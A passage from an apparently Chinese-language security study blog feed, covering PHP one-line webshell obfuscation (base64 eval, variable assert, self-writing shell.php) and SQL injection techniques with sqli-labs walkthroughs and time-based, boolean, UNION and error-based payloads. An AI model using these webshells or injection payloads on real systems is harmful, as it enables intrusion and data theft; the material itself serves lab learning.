href="#二、混淆技术" class="headerlink" title="二、混淆技术"></a>二、混淆技术</h3><ol><li><p><strong>字符串拼接</strong>：</p><ul><li>写法：<code>&lt;?php $&#123;&#39;_&#39;.&#39;P&#39;.&#39;O&#39;.&#39;S&#39;.&#39;T&#39;&#125;[&#39;cmd&#39;]=&quot;系统命令&quot;; ?&gt;</code></li><li>分析：通过将字符逐个拼接成函数名或变量名，可以绕过一些简单的字符串匹配检测。</li></ul></li><li><p><strong>变量替换</strong>：</p><ul><li>写法：<code>&lt;?php $a=&quot;assert&quot;;$a(@$_POST[&#39;a&#39;]); ?&gt;</code></li><li>分析：通过变量替换，将恶意函数名存储在变量中，再调用该变量执行恶意代码。</li></ul></li></ol><h3 id="三、加密与自解密"><a href="#三、加密与自解密" class="headerlink" title="三、加密与自解密"></a>三、加密与自解密</h3><ol><li><p><strong>Base64编码</strong>：</p><ul><li>写法：<code>&lt;?php eval(base64_decode(&quot;ZWNobyBoZWxsbyB3b3JsZA==&quot;)); ?&gt;</code></li><li>分析：使用Base64编码对恶意代码进行加密，然后在执行时再进行解码。这种技术可以绕过一些基于字符串匹配的检测。</li></ul></li><li><p><strong>其他加密方式</strong>：</p><ul><li>除了Base64编码外，还可以使用其他加密方式（如AES、RSA等）对恶意代码进行加密。但需要注意的是，加密后的代码需要在服务器端进行解密和执行，因此可能会增加服务器的负担和暴露更多的攻击面。</li></ul></li></ol><h3 id="四、高级变形"><a href="#四、高级变形" class="headerlink" title="四、高级变形"></a>四、高级变形</h3><ol><li><p><strong>利用正则函数执行代码</strong>：</p><ul><li>写法：<code>&lt;?php preg_replace(&#39;/.*/e&#39;,$_POST[&#39;cmd&#39;],&#39;&#39;); ?&gt;</code></li><li>分析：在某些环境下，<code>preg_replace()</code>函数可以使用<code>/e</code>修饰符来执行替换代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。但需要注意的是，这种方式在PHP新版本中已被废弃或限制使用。</li></ul></li><li><p><strong>动态写入语句</strong>：</p><ul><li>写法：<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;); ?&gt;</code></li><li>分析：通过动态写入语句的方式，在服务器上创建一个新的PHP文件，并在其中包含一句话木马。这样即使原始的一句话木马被删除或修改，攻击者仍然可以通过新创建的文件继续控制服务器。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="一句话木马" scheme="http://example.com/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>时间盲注</title>
    <link href="http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
    <published>2024-11-11T20:02:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>时间盲注（Time-based Blind SQL Injection）是SQL注入攻击的一种特殊形式，尤其在Web应用程序不显示任何错误信息或反馈时使用。以下是对时间盲注的详细讲解：</p><h3 id="一、时间盲注的原理"><a href="#一、时间盲注的原理" class="headerlink" title="一、时间盲注的原理"></a>一、时间盲注的原理</h3><p>时间盲注利用了数据库的延时函数（如MySQL的SLEEP()或BENCHMARK()）来创建可以测量的响应时间差，从而推断出查询的结果。当攻击者发送一个包含延时函数的SQL查询时，如果查询的条件为真，数据库将执行延时操作，导致应用程序的响应时间显著增加。反之，如果查询的条件为假，则不会执行延时操作，应用程序响应迅速。攻击者通过观察和测量不同请求的响应时间，可以判断出数据库的某些信息。</p><h3 id="二、时间盲注的利用方式"><a href="#二、时间盲注的利用方式" class="headerlink" title="二、时间盲注的利用方式"></a>二、时间盲注的利用方式</h3><ol><li><p><strong>判断是否存在SQL注入漏洞</strong>：</p><ul><li>攻击者首先尝试在输入字段中添加单引号或其他特殊字符，观察页面响应时间。如果页面响应时间明显变长，则可能存在SQL注入漏洞。</li></ul></li><li><p><strong>获取数据库信息</strong>：</p><ul><li>攻击者通过输入特定语句（如<code>1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -</code>），观察响应时间，可以判断出数据库类型。</li><li>利用时间盲注的原理，逐步猜测数据库名称、表名称、列名称等信息。例如，要获取数据库名称，可以尝试输入类似<code>1&#39; AND IF(SUBSTRING(DATABASE(),1,1)=&#39;s&#39;,SLEEP(5),0)-- -</code>的语句。</li></ul></li><li><p><strong>使用自动化工具</strong>：</p><ul><li>为了提高攻击效率，攻击者可能会使用自动化工具（如Burp Suite、sqlmap等）进行半自动化或自动化注入。</li><li>这些工具能够自动构造恶意输入，并分析应用程序的响应时间，以获取关键信息。</li></ul></li></ol><h3 id="四、时间盲注的案例分析"><a href="#四、时间盲注的案例分析" class="headerlink" title="四、时间盲注的案例分析"></a>四、时间盲注的案例分析</h3><p>假设有一个存在SQL注入漏洞的Web应用程序，攻击者可以通过以下步骤利用时间盲注获取数据库信息：</p><ol><li><p><strong>判断是否存在SQL注入漏洞</strong>：</p><ul><li>攻击者在输入字段中输入<code>1&#39; AND SLEEP(5)-- -</code>，观察页面响应时间。如果响应时间显著增加（如5秒），则表明存在SQL注入漏洞。</li></ul></li><li><p><strong>获取数据库版本信息</strong>：</p><ul><li>攻击者输入<code>1&#39; AND IF(SUBSTRING(VERSION(),1,1)=&#39;5&#39;,SLEEP(5),0)-- -</code>，如果响应时间增加，则表明数据库版本的第一个字符是’5’。通过不断调整猜测的字符，攻击者可以逐步获取完整的数据库版本信息。</li></ul></li><li><p><strong>获取数据库名称</strong>：</p><ul><li>攻击者使用类似的语句逐步猜测数据库名称的每个字符，直到获取完整的数据库名称。</li></ul></li><li><p><strong>获取表名称和列名称</strong>：</p><ul><li>攻击者可以继续使用时间盲注的方法获取数据库中的表名称和列名称。</li></ul></li><li><p><strong>获取数据</strong>：</p><ul><li>一旦获取了表名称和列名称，攻击者就可以构造恶意的SQL查询语句来获取表中的数据。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>联合注入</title>
    <link href="http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/11/11/web/sql%E6%B3%A8%E5%85%A5/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
    <published>2024-11-11T19:45:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SQL UNION注入是一种攻击技术，攻击者通过构造恶意的输入，利用UNION操作符添加额外的查询部分，将其他原本不应出现在当前查询中的数据合并到结果集中，从而达到获取敏感数据或执行未授权操作的目的。以下是对SQL UNION注入的详细讲解：</p><h3 id="一、UNION查询的特性"><a href="#一、UNION查询的特性" class="headerlink" title="一、UNION查询的特性"></a>一、UNION查询的特性</h3><p>UNION联合查询的作用是把多个表中的数据联合在一起进行显示。使用UNION查询时，需要注意以下几点：</p><ol><li>使用UNION查询的SELECT语句必须拥有相同数量的字段，同时每条SELECT语句中的字段顺序必须相同。</li><li>UNION操作符默认去除重复的记录，如果需要保留所有记录（包括重复的记录），可以使用UNION ALL。</li></ol><h3 id="二、UNION注入的原理"><a href="#二、UNION注入的原理" class="headerlink" title="二、UNION注入的原理"></a>二、UNION注入的原理</h3><p>当应用程序在构建SQL查询时，如果将用户输入未经充分验证和清理就直接拼接到查询语句中，就可能存在SQL注入漏洞。攻击者可以利用这一漏洞，通过构造恶意的输入，利用UNION操作符添加额外的查询部分，从而将其他数据合并到结果集中。</p><p>例如，原始的SQL查询可能是：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> <span class="keyword">condition</span> <span class="operator">=</span> <span class="string">&#x27;$user_input&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>如果应用程序没有对用户输入<code>$user_input</code>进行严格过滤和验证，攻击者可以输入类似以下的恶意内容：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT sensitive_column1, sensitive_column2 FROM sensitive_table --</span></span><br></pre></td></tr></table></figure></div><p>这样，数据库会将攻击者构造的新查询与原始查询通过UNION连接起来执行，从而将原本受保护的敏感数据从<code>sensitive_table</code>表中提取出来并显示在结果集中。</p><h3 id="三、UNION注入的利用流程"><a href="#三、UNION注入的利用流程" class="headerlink" title="三、UNION注入的利用流程"></a>三、UNION注入的利用流程</h3><ol><li><strong>确定输入点</strong>：找到可以输入数据并且该数据会被直接拼接到SQL查询中的地方。</li><li><strong>确定字段数量</strong>：通过尝试不同数量的列，观察服务器的响应，以确定原始查询中选择的字段数量，以便在注入的UNION查询中提供相同数量的列。</li><li><strong>确定数据类型</strong>：了解每个列所期望的数据类型，以便构造合法的注入查询。</li></ol><p>一旦这些前置条件确定，攻击者就可以构造恶意的UNION查询来执行未授权的数据库操作。</p><h3 id="四、UNION注入的示例"><a href="#四、UNION注入的示例" class="headerlink" title="四、UNION注入的示例"></a>四、UNION注入的示例</h3><p>假设有一个存在SQL注入漏洞的Web应用程序，其后台SQL查询语句如下：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>攻击者可以在<code>$id</code>参数中注入恶意的SQL代码，例如：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user(),database()#</span></span><br></pre></td></tr></table></figure></div><p>这样，构造的SQL查询语句将变为：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),database()#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div><p>执行这条查询语句后，攻击者可以获得当前数据库的用户名和数据库名等敏感信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>布尔盲注</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2024-11-07T19:50:23.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>布尔盲注（Boolean-based blind injection）是一种常见的SQL注入攻击技术，用于检测和利用Web应用程序中的漏洞。以下是对布尔盲注的详细讲解：</p><h3 id="一、布尔盲注的原理"><a href="#一、布尔盲注的原理" class="headerlink" title="一、布尔盲注的原理"></a>一、布尔盲注的原理</h3><p>布尔盲注的原理基于布尔逻辑运算的真假判断。当攻击者向目标应用程序发送恶意的输入时，如果应用程序存在漏洞，攻击者可以利用布尔盲注来逐步获取关键信息或执行恶意操作。由于布尔盲注不能通过直接显示的途径来获取数据库数据，攻击者需要观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假，从而推断出关键信息的值。</p><h3 id="二、布尔盲注的利用方式"><a href="#二、布尔盲注的利用方式" class="headerlink" title="二、布尔盲注的利用方式"></a>二、布尔盲注的利用方式</h3><ol><li><p><strong>判断真假</strong>：</p><ul><li>攻击者通过发送特定的恶意输入，观察应用程序的响应或页面上的行为变化，来判断某个条件是真还是假。</li></ul></li><li><p><strong>逐位判断</strong>：</p><ul><li>攻击者通常会逐位地检查关键信息的每个字符，比如数据库的表名、列名或数据内容。</li><li>通过构造特定的布尔逻辑语句，攻击者可以利用应用程序的响应，逐位地确定字符的真假。</li></ul></li><li><p><strong>基于推断</strong>：</p><ul><li>通过观察应用程序的不同响应，攻击者可以推断出关键信息的值。</li><li>例如，攻击者可以通过逐位比较字符的ASCII码范围来获取敏感信息的值。</li></ul></li></ol><h3 id="三、布尔盲注的常用语句和技巧"><a href="#三、布尔盲注的常用语句和技巧" class="headerlink" title="三、布尔盲注的常用语句和技巧"></a>三、布尔盲注的常用语句和技巧</h3><ol><li><p><strong>判断查询结果的长度</strong>：</p><ul><li>使用MySQL的<code>length()</code>函数判断返回结果的长度。</li><li>例如，判断当前数据库名的长度，可以构造如下语句：<code>?id=1&#39; and length(database())=N --</code>（其中N为猜测的长度）。</li></ul></li><li><p><strong>截取和判断字符</strong>：</p><ul><li>使用<code>substr()</code>函数截取查询结果的第一个字符。</li><li>使用<code>ascii()</code>函数将截取的字符转换成ASCII编码。</li><li>通过构造如下语句，可以判断截取的字符的ASCII码是否等于某个值：<code>?id=1&#39; and ascii(substr(database(),1,1))=M --</code>（其中M为猜测的ASCII码值）。</li></ul></li><li><p><strong>使用自动化工具</strong>：</p><ul><li>为了简化攻击过程，攻击者可以使用自动化工具，如SQL注入工具包（如sqlmap），来执行布尔盲注攻击。</li><li>这些工具能够自动构造恶意输入，并分析应用程序的响应，以获取关键信息。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入方式(报错注入)</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2024-11-07T16:40:52.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-通过floor报错"><a href="#1-通过floor报错" class="headerlink" title="(1). 通过floor报错"></a>(1). 通过floor报错</h2><p>and (select 1 from (select count(*),concat((payload) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)</p><p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p><h2 id="2-通过updatexml报错"><a href="#2-通过updatexml报错" class="headerlink" title="(2). 通过updatexml报错"></a>(2). 通过updatexml报错</h2><p>and updatexml(1,payload,1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><h2 id="3-通过ExtractValue报错"><a href="#3-通过ExtractValue报错" class="headerlink" title="(3). 通过ExtractValue报错"></a>(3). 通过ExtractValue报错</h2><p>and extractvalue(1, payload)</p><p>输出字符有长度限制，最长32位。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql靶场第一题思路</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study1/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study1/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?/id=1" >http://127.0.0.1?/id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ 时,报错说明是字符型注入</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字–+ （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3–+</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据（将id弄成负数，使前面的语句失效）</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=-1" >http://127.0.0.1/?id=-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()–+</p><p>我们发现名字可能叫users</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’–+ (如果库名是字符型，此处库名要转成十六进制)</p><p>我们发现username和password字段</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’–+ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名 –+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql靶场第二题思路</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study2/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study2/</id>
    <published>2024-11-07T09:40:02.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84%22%E5%8D%95%E5%BC%95%E5%8F%B7%22%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF" >http://127.0.0.1/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，由于1&#x3D;2不成立，也会报错</p></li></ol><p>满足这三个，基本上就是数字注入了</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%A4%E4%B8%BAid%E5%8F%AB%E5%81%9A1%27%E3%80%82%E6%9F%A5%E8%AF%A2%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AAid%E8%80%8C%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E3%80%82%EF%BC%88%E5%9C%A8%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%AD%EF%BC%8C%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%BC%95%E5%8F%B7%E7%9A%84%E9%97%AD%E5%90%88%EF%BC%89" >http://127.0.0.1/?id=1&#39;时，数据库认为id叫做1&#39;。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and ‘1’&#x3D;’1 在’1’&#x3D;’1之后没有加上’是因为传参时输入的内容已经被’ ‘包围。</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字 （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’ (如果库名是字符型，此处库名要转成十六进制)</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql注入一般步骤</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/</id>
    <published>2024-11-07T09:38:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
